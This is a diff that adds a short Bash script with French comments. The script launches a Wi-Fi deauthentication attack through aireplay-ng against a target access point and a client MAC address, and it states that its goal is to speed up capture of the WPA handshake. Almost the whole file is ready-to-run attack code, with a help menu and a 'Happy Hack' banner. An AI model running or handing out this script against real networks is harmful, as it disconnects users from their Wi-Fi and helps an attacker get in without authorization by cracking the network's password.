@@ -1,0 +1,47 @@
+#desauthentification pour accélérer le processus d'obtention du handshake
+
+clear
+echo -e "\n****Desauthentification pour accélérer le processus d'obtention du handshake*****\n"
+echo -e "*****Par HARA ZANG Ulrich*****\n"
+echo -e "Date: `date`\n"
+
+
+Help()
+{
+   # Display Help
+   echo "Description of the deauth"
+   echo
+   echo "Syntax: ./deauth [-h] [number_of_packets] [mac_target_wifi] [mac_target_station] "
+   echo "options:"
+   echo "h     Print this Help."
+   echo -e ""
+   echo "params:"
+   echo "number_of_packets     the number of packets to send for deauthentication"
+   echo "mac_target_wifi       the mac address of the target wifi"
+   echo "mac_target_station    the mac address of the station connect to the wifi"
+   echo ""
+}
+
+
+while getopts ":h" option; do
+   case $option in
+      h) # display Help
+         Help
+         exit;;
+     \?) # incorrect option
+         echo "Error: Invalid option"
+         exit;;
+   esac
+done
+
+
+
+number_of_packets=$1
+mac_target_wifi=$2
+mac_target_station=$3
+
+aireplay-ng -0 $number_of_packets -a $mac_target_wifi -c $mac_target_station wlan0
+
+echo -e "*********************"
+echo -e "*   Happy Hack :)   *" 
+echo -e "*********************\n\n"
